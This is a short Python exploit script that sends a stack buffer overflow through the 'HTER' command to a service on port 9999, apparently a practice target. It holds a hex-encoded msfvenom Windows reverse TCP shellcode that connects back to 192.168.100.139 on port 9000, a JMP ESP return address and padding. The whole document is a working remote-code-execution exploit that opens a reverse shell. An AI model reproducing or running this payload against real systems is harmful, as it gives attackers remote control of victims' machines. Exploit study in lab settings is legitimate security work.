import socket, sys

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.100.139 LPORT=9000 -f hex -b "\x00" EXITFUNC=thread
# Payload size: 351 bytes

buf = ""
buf += "dbdeb8602a1335d97424f45d29c9b15231451783c504032539f1c059d5772aa12618a2441718d00d08a89243a543f6773e21df78f78c39b708bc7ad68abfae38b20fa339f3724e6bacf9fd9bd9b43d10915946c5625b6758f802a75b2d3fee43327ab8f880f03b28d9f99015d50be852d2f39faa2089a7695a552d69fc1e9555fcf3401ef2b80778173ecbf323cbead3a58fc8f7ee5470ae4a3a8db034e32bbbd9f041e6b53568184652fb6b74fd57e334767ef43badc66ac24e37a3011a67dba023ec1b4cf6a34be2a9033b421aec514d450c5a87eea7a140d190cd1bb9e20d3f126aeb55723aa4c1eb673e73f3bd3bb37f32bc7a883faeeb780a8cba87a0b821152f382f06f86f78f8f1e594a3ab1b6535939fb2861a1e36b238308e3b05645e6ad3d218c4958cf2bb7f5882f7bf1e8bdd49fe3a880f01f25c987aeefc6751aa1d8a73c7b513166ad8a3cda9e527e751123782545eff7f25cf6a7f9af0be"

host = sys.argv[1]

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

jmpesp = "05125062" # 62501205

buffer = "A" * 2041 + jmpesp + "41" * 20 + buf + "42" * 2000

s.connect((host, 9999))

s.send("HTER %s\r\n" %buffer)

s.close()
